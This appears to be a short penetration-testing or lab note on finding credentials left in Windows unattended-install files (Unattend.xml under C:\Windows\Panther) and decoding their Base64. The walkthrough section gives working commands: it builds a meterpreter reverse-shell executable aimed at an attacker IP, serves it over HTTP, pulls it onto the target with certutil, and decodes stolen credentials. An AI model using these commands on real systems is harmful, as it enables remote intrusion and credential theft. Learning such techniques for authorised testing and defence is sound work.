# Searching for passwords in Windows configuration files

Windows can automate a variety of repetitive tasks, such as mass rollout or installing Windows in several systems. This is typically done through the use of the `Unattended Installation Setup Utility`, which is used to automate the Windows installation process.
<br>
If the Unattended Install configuration is left on in the system after the installation process is complete, they can reveal sensitive information like clear-text credentials that may be used by malicious actors.
<br>
The Unattended Windows Setup Utility will typically use one of the following configuration files that contain files that contain user accounts and system configuration information.

- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`

As a security precaution, sometimes the credentials may be stored in the Unattended configuration files may be encoded in Base64 but they can be easily decoded by an attacker.

#### GENERATING REV SHELL PAYLOAD:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.19.3 LPORT=1234 -f exe > payload.exe
```

#### TRANSFERRING PAYLOAD TO TARGET
On Attacker Machine:
```
python3 -m http.server 80
```

On Target Shell
```
certutil -urlcache -f http://10.10.19.3/payload.exe payload.exe
```

#### UNATTENDED.xml COFIG FILE - FILE PATH
```
C:\Windows\Panther
```

#### DECODING BASE64
```
echo Qwdw89h | base64 -d
```
